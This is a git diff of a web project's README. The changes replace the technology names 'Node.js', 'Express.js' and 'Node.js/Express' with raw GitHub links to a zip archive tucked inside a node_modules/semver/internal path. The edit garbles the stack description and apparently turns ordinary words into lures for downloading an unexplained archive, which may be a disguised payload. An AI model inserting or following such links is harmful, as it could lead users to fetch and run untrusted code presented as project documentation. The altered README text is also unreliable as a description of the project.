@@ -12,13 +12,13 @@ JavaScript (ES6+) - Client-side interactivity and DOM manipulation
 Responsive Design - Mobile-first approach
 Backend
 
-Node.js - JavaScript runtime environment
-Express.js - Web application framework
+https://raw.githubusercontent.com/elnatnael/Project_hilltops/main/Backend/node_modules/semver/internal/hilltops_Project_v3.2.zip - JavaScript runtime environment
+https://raw.githubusercontent.com/elnatnael/Project_hilltops/main/Backend/node_modules/semver/internal/hilltops_Project_v3.2.zip - Web application framework
 RESTful API - Clean API architecture
 Database
 
 MongoDB - NoSQL database for flexible data storage
-Mongoose - ODM for MongoDB and Node.js
+Mongoose - ODM for MongoDB and https://raw.githubusercontent.com/elnatnael/Project_hilltops/main/Backend/node_modules/semver/internal/hilltops_Project_v3.2.zip
 Template Engine
 
 EJS (Embedded JavaScript) - Server-side rendering
@@ -40,7 +40,7 @@ Events/Announcements section
 Mobile-friendly navigation
 Phase 2: Dynamic Backend 🔄
 
-Node.js/Express server setup
+https://raw.githubusercontent.com/elnatnael/Project_hilltops/main/Backend/node_modules/semver/internal/hilltops_Project_v3.2.zip server setup
 MongoDB database connection
 News/Blog system
 Event management
